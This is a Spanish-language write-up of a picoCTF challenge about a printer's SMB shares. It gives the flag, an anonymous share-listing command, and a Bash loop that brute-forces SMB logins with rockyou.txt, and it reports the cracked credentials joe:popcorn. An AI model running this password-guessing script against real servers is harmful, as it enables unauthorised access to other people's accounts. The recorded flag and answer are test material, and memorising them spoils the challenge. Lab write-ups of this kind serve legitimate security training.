## **Descripcion**
A Secure Printer is now in use. I’m confident no one can leak the message again... or can you?two printers are on `55964`, one private, one public.you can try `$ nc -vz green-hill.picoctf.net 55964`

## **Solucion**

picoCTF{5mb_pr1nter_5h4re5_5ecure_b243735c}
## **Notas adicionales**
### paso 1

Se detectó un servicio Samba corriendo en el puerto **55964**. Se procedió a listar los recursos compartidos sin credenciales (Acceso Anónimo):

**Comando:** `smbclient -L green-hill.picoctf.net -p 55964 -N`

**Resultados:**

- `shares`: Disco público con acceso para invitados.
    
- `secure-shares`: Recurso privado (objetivo).
    
### Paso 2

Se accedió al recurso `shares` y se descargaron los archivos disponibles: `notification.txt`, `content.txt` y `kafka.txt`. Al revisar `notification.txt`, se identificó:

1. Un nombre de usuario válido: **joe**.
    
2. Un aviso sobre una vulnerabilidad en la impresora y el uso de una **contraseña por defecto**.
    
### Paso 3

Dado que no se conocía la contraseña por defecto, se utilizó un script en Bash para automatizar el proceso de prueba de contraseñas utilizando el diccionario estándar de la industria: `rockyou.txt`.


```
#!/bin/bash
# Variables de entorno
URL="//green-hill.picoctf.net/secure-shares"
PORT="55964"
USER="joe"
WORDLIST="/usr/share/wordlists/rockyou.txt"

for password in $(cat $WORDLIST); do
    # Intentamos conectar y ejecutar un comando simple (ls)
    smbclient $URL -p $PORT -U $USER%$password -c "ls" > /dev/null 2>&1
    
    # Si el código de salida ($?) es 0, la conexión fue exitosa
    if [ $? -eq 0 ]; then
        echo "[+] Contraseña encontrada: $password"
        break
    fi
done
```

**Resultado de la ejecución:**

- **Credenciales encontradas:** `joe:popcorn`.    
### Paso 4 

Con las credenciales obtenidas, se accedió al recurso bloqueado para extraer la bandera:

**Comando final:** `smbclient //green-hill.picoctf.net/secure-shares -p 55964 -U joe%popcorn` `smb: \> get flag.txt`
## **Referencias**
https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt/data